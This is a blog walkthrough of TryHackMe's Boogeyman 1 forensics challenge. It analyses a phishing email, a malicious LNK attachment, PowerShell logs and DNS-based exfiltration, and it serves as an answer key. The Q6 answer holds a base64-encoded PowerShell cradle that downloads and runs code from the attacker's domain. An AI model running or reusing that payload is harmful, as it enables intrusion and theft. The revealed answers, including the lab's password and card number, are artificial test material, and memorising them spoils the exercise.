---
author: Ricard Alcaraz Mancebo
title: Boogeyman 1 - TryHackMe
tags:
  - Cybersecurity
  - Blue Team
  - TryHackMe
  - Network Forensics
  - Network Analysis
languages:
  - wireshark
  - cyberchef
image:
  url: https://ricard-alcaraz.com/images/bogeyman-1-thm/main.png
  alt: image
description: My notes solving Boogeyman 1 - TryHackMe
pubDate: 2025-09-10T20:22:00.000+02:00
---
## Scenario

Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.

The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector.

You are tasked to analyse and assess the impact of the compromise.

## Documents Provided

## Task 2

### Q1: What is the email address used to send the phishing email?

We need to analyze an email, with the name `dump.eml` I will open it using Thunderbird, for the analysis. To find the email adress that send the email we have to take a look at the header of the mail and find `From`.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    agriffin@bpakcaging.xyz
  </div>
</details>

### Q2: What is the email address of the victim?

Still loking at the header, we should search for `To` to find the victim that received the email.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    julianne.westcott@hotmail.com
  </div>
</details>

### Q3: What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?

Now we shoud check the message source to look for this information, you can see going to `View > Message Source` or use `Ctrl+U` in `Thunderbird`. There we have to search for the DKIM-Signature, and once there see if we can find a third-party mail relay. We can search the domain to see if its a possible mail relay if we dont know.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    elasticemail
  </div>
</details>

### Q4: What is the name of the file inside the encrypted attachment?

Now the task asks us to download the attachment, which is a .zip file, and then unzip it to obtain the file inside. The zip its encrypted but in the mail we have the password, once we do it we will obtain the name of the file.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    Invoice_20230103.lnk
  </div>
</details>

### Q5: What is the password of the encrypted attachment?

We already know this information, we can find it in the email.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    Invoice2023!
  </div>
</details>

### Q6: Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

Here we need to use the tool lnkparser, we have an example in the task. Once we do it wi will find a field with the name `Command line arguments`, there we will find a command which last part is some encoded string, we just have to paste that for the answer we dont have to decode it.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
  </div>
</details>

## Task 3

### Q7: What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)

Now we will use the powershell log provided, parsing it with the jq tool. For this one I used this command:
`cat powershell.json | jq '.ScriptBlockText' | less`
I wanted to obtain information related to commands executed, then I had to scroll investigating the results, we will nnot need to scroll too much to find the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
cdn.bpakcaging.xyz,files.bpakcaging.xyz
  </div>
</details>

### Q8: What is the name of the enumeration tool downloaded by the attacker?

Using the same query I was searching for the download files, we can add a grep to try to find it easier. In this case its a tool that is open source.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    seatbelt
  </div>
</details>

### Q9: What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.

Again using the same query, but using the grep command to search for the sq3.exe, and we will find the relative path, in order to complete the path we should find the name of the user, for example you can try to search for the `Users` folder to see if there is an absolute path with the name of the user in it, and then we will have it.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite
  </div>
</details>


### Q10: What is the software that uses the file in Q3?

We have the answer in the previous question if we take a look at the obtained path.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    Microsoft Sticky Notes
  </div>
</details>

### Q11: What is the name of the exfiltrated file?

For this one I didn't find a easier way than looking at the same query as before, just trying to find references to a document or file.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    protected_data.kdbx
  </div>
</details>

### Q12: What type of file uses the .kdbx file extension?

If we don't know the answer we can find it just by searching on the internet about this extension.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    KeePass
  </div>
</details>

### Q13: What is the encoding used during the exfiltration attempt of the sensitive file?

Here we have some help from the attacker that names a variable as the encoding, anyways we can try to understand some of the commands that executes to try to find the encoding.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    Hex
  </div>
</details>

### Q14: What is the tool used for exfiltration?

For this one I analized the next commands in order to see if there was something interesting, at some point we will find a code that is reading the file, and also as a hit we have a message of completition, once we find it we will see the tool used.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    nslookup
  </div>
</details>

### Q15: What software is used by the attacker to host its presumed file/payload server?

Now we have to move to `Wireshark`, there we have to take a look at the response of the server where the attacker downloads its files, we already know the two domains that the attacker uses, so checking the headers of the responses we will find the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    python
  </div>
</details>

### Q16: What HTTP method is used by the C2 for the output of the commands executed by the attacker?

Filtering by http we will find a clear view if we didnt do it before, now we can try to identify which is the command for the output, from the previous task we already know some of the commands used and which ones outputs information, if we search for it we will find the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    POST
  </div>
</details>

### Q17: What is the protocol used during the exfiltration activity?

For this one we just have to see where the HTTP packets ends and which ones starts massively.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    DNS
  </div>
</details>

### Q18: What is the password of the exfiltrated file?

For this one I started looking at the final POST requests, we know that they contain the information that its gathering and it sending it to the C2 server.
Looking for the ones that have a longer lenght, I found out that the packet 40083 contains the output of the tool seatbelt that cointains different credentials using `CyberChef` we can decode it using the receipt `From Decimal`.
There we can find the file that contains the credentials we need, but its not there, so I searched for the following ones untils I found it.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
%p9^3!lL^Mz47E2GaT^y
  </div>
</details>

### Q19: What is the credit card number stored inside the exfiltrated file?

Now we have 2 options, we know that the protocol used for the exfiltration is DNS, if we take a look at the DNS packets, using a filter to get he responses `dns.resp.type` we will find at the end. 

![wireshark](/images/bogeyman-1-thm/q19.png)

We can see that the responses contain a string before the domain, if we get all of these we will find the data of the file.
Also we can take a look at the POST requests, and one of the last ones also contain this information, the packet number `48732` but you have to clean it up.

Finally we can use `CyberChef` and use the receipt `From Hex` and save the file as `.kbdx`.
Once we have that we can open it with KeePass and use the master password that we obtained in the past question.

![keepass](/images/bogeyman-1-thm/q20.png)

<details>
  <summary>Click to reveal the answer</summary>
  <div>
4024007128269551
  </div>
</details>

